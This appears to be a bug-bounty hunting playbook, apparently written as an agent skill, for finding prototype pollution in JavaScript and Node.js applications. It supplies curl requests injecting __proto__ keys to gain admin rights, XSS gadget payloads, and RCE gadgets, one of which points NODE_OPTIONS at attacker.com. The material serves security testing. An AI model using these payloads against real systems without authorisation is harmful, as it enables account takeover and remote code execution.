---
name: hunt-prototype-pollution
description: Hunt Prototype Pollution — client-side and server-side PP, __proto__ injection, constructor manipulation, script gadget exploitation, RCE chains. High when leading to XSS or RCE. Use when testing JS applications, Node.js APIs, or libraries using object merge/assign.
sources: hackerone_public
---

# HUNT-PROTOTYPE-POLLUTION — Prototype Pollution

## Crown Jewel Targets

Prototype Pollution is Critical when it leads to RCE (server-side Node.js) or High when it leads to XSS (client-side).

- **Node.js APIs** — `_.merge()`, `_.defaultsDeep()`, `Object.assign()`, spread operator with user input
- **Admin panels** — PP in JSON parsing → bypass auth checks via `__proto__.isAdmin=true`
- **JS bundlers/webpack** — script gadgets on polluted `Object.prototype`
- **Express body parsers** — `body-parser` JSON with `__proto__` keys
- **jQuery extend** — `$.extend(true, {}, userInput)` client-side PP

## Attack Surface Signals

```
Server-side: JSON body parser accepting nested __proto__ keys
Client-side: libraries using deep merge/clone/assign
  jQuery.extend(true, {}, userData)
  _.merge({}, userData)
  _.defaultsDeep({}, userData)
  JSON.parse() with __proto__ key in string
  Object.assign({}, userData)
  Spread: {...userData}
```

## Step-by-Step Hunting Methodology

### Phase 1 — Client-Side Detection

```javascript
// Test in browser console
const test = JSON.parse('{"__proto__":{"polluted":"true"}}');
const obj = {};
console.log(obj.polluted); // "true" if vulnerable

// Or via URL parameter reflection
// If the page JSON-parses URL params, inject:
// ?__proto__[polluted]=true
// Then check: Object.prototype.polluted
```

### Phase 2 — Server-Side Detection

```bash
# Send __proto__ in JSON body
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# Try constructor prototype
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'

# Check if you have admin access after pollution
```

### Phase 3 — Script Gadget Exploitation (Client-Side → XSS)

```javascript
// Find a script gadget that reads from Object.prototype
// Common gadgets:
// - Libraries that check options[key] where key comes from prototype
// - Code that iterates Object.keys() and uses values in innerHTML

// Example: jQuery UI gadget
{"__proto__":{"appendTo":"<img src=x onerror=alert(1)>"}}
```

### Phase 4 — Server-Side → RCE

```bash
# Node.js child_process gadget chain
# Exploit via command injection in exec() or spawn()
curl -X POST https://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"node","argv0":"/proc/self/exe","NODE_OPTIONS":"--require=/tmp/evil.js"}}'
```

## Payload Templates

```json
// Basic pollution
{"__proto__":{"isAdmin":true}}

// Constructor variant
{"constructor":{"prototype":{"isAdmin":true}}}

// Nested pollution
{"__proto__":{"admin":{"isAdmin":true}}}

// Script gadget for XSS
{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}

// Server-side RCE gadget
{"__proto__":{"shell":"node","env":{"NODE_OPTIONS":"--inspect=attacker.com:9229"}}}
```

## Common Root Causes

- `_.merge()`, `$.extend(true,)`, and similar deep-merge functions don't filter `__proto__` keys
- `JSON.parse()` preserves `__proto__` keys — safe in isolation, dangerous when merged
- Spread operator `{...userData}` doesn't filter prototype properties
- Express body-parser passes `__proto__` through to application code
- Libraries that iterate object keys and use values in dangerous sinks

## Gate 0 Validation

- [ ] Have I confirmed `Object.prototype` was modified?
- [ ] Client-side: Does a polluted property reach a DOM sink?
- [ ] Server-side: Can I trigger a different server response after pollution?
- [ ] Have I chained PP to actual impact (XSS/RCE)?
